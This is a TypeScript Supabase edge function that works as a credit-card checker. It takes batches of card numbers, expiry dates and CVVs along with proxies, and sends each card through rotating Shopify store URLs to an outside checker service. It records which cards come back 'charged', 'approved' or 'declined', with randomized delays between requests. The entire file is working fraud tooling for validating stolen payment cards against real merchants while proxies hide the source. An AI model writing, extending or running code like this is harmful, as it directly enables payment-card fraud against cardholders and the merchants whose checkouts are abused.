import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

/* ── Main handler ── */
Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response(null, { headers: corsHeaders });

  try {
    const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
    const serviceKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
    const supabase = createClient(supabaseUrl, serviceKey);

    // Auth check
    const authHeader = req.headers.get("authorization") || "";
    const token = authHeader.replace("Bearer ", "");
    const { data: { user }, error: authErr } = await supabase.auth.getUser(token);
    if (authErr || !user) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const body = await req.json();
    const { job_id, cards, proxies } = body as {
      job_id: string;
      cards: { card: string; expiry: string; cvv: string }[];
      proxies: string[];
    };

    if (!job_id || !cards?.length || !proxies?.length) {
      return new Response(JSON.stringify({ error: "Missing required fields: job_id, cards, proxies" }), {
        status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // Fetch sites from DB (owner-managed)
    const { data: siteRows, error: sitesErr } = await supabase
      .from("shopify_sites")
      .select("url");

    if (sitesErr || !siteRows?.length) {
      return new Response(JSON.stringify({ error: "No Shopify sites configured. Ask an owner to add sites." }), {
        status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    const sites = siteRows.map((r: any) => r.url);

    // Update job to running
    await supabase.from("check_jobs").update({ status: "running" }).eq("id", job_id);

    // Process cards in background
    const processCards = async () => {
      let processed = 0, charged = 0, approved = 0, declined = 0;

      for (let i = 0; i < cards.length; i++) {
        // Check if job was stopped
        const { data: jobCheck } = await supabase.from("check_jobs").select("status").eq("id", job_id).single();
        if (jobCheck?.status === "stopped") break;

        const c = cards[i];
        const siteIndex = Math.floor(i / 10) % sites.length;
        const site = sites[siteIndex];
        const proxy = proxies[i % proxies.length];

        // Update result to checking
        await supabase.from("check_results")
          .update({ status: "checking", site_used: site })
          .eq("job_id", job_id)
          .eq("card_number", c.card)
          .eq("expiry", c.expiry)
          .eq("cvv", c.cvv);

        // Build CC string: card|month|year|cvv
        const parts = c.expiry.split("/");
        const mon = parts[0] || "";
        const yr = parts[1] || "";
        const ccStr = `${c.card}|${mon}|${yr}|${c.cvv}`;

        // Parse proxy: host:port:user:pass -> http://user:pass@host:port
        const proxyParts = proxy.split(":");
        let proxyUrl = proxy;
        if (proxyParts.length === 4) {
          proxyUrl = `${proxyParts[0]}:${proxyParts[1]}:${proxyParts[2]}:${proxyParts[3]}`;
        }

        // Call external Shopify checker endpoint
        let result = { status: "declined", code: "ERROR", message: "Unknown error" };
        try {
          const apiUrl = `https://sublime-expression-production-be62.up.railway.app/api.php?cc=${encodeURIComponent(ccStr)}&site=${encodeURIComponent(site)}&proxy=${encodeURIComponent(proxyUrl)}`;
          const resp = await fetch(apiUrl, { method: "GET" });
          const text = await resp.text();
          console.log(`Card ${i+1} response:`, text);

          // Parse response - try JSON first, then text patterns
          try {
            const json = JSON.parse(text);
            result = {
              status: json.status === "charged" ? "charged" : json.status === "approved" ? "approved" : "declined",
              code: json.code || json.response_code || json.gateway_code || "",
              message: json.message || json.response || json.msg || text.slice(0, 200),
            };
          } catch {
            // Parse text response patterns
            const lowerText = text.toLowerCase();
            if (lowerText.includes("charged") || lowerText.includes("charge of")) {
              // Extract amount if present (e.g. "Charged $1.00" or "charge of $0.50")
              const amountMatch = text.match(/\$[\d.]+/);
              result = { status: "charged", code: "CHARGED", message: amountMatch ? `Charged ${amountMatch[0]}` : text.slice(0, 200) };
            } else if (lowerText.includes("approved") || lowerText.includes("success")) {
              result = { status: "approved", code: "APPROVED", message: text.slice(0, 200) };
            } else {
              result = { status: "declined", code: "DECLINED", message: text.slice(0, 200) };
            }
          }
        } catch (fetchErr: any) {
          console.error(`Card ${i+1} fetch error:`, fetchErr.message);
          result = { status: "declined", code: "FETCH_ERROR", message: fetchErr.message };
        }

        // Update result
        if (result.status === "charged") charged++;
        else if (result.status === "approved") approved++;
        else declined++;
        processed++;

        await supabase.from("check_results")
          .update({
            status: result.status,
            response_code: result.code,
            response_message: result.message,
            site_used: site,
          })
          .eq("job_id", job_id)
          .eq("card_number", c.card)
          .eq("expiry", c.expiry)
          .eq("cvv", c.cvv);

        // Update job progress
        await supabase.from("check_jobs").update({ processed, charged, approved, declined }).eq("id", job_id);

        // Small delay between cards
        await new Promise((r) => setTimeout(r, 500 + Math.random() * 500));
      }

      // Mark job complete
      await supabase.from("check_jobs").update({
        status: "completed", processed, charged, approved, declined, completed_at: new Date().toISOString(),
      }).eq("id", job_id);
    };

    // Fire and forget
    processCards().catch(async (err) => {
      console.error("Job failed:", err);
      await supabase.from("check_jobs").update({ status: "failed" }).eq("id", job_id);
    });

    return new Response(JSON.stringify({ success: true, job_id }), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (err: any) {
    return new Response(JSON.stringify({ error: err.message }), {
      status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
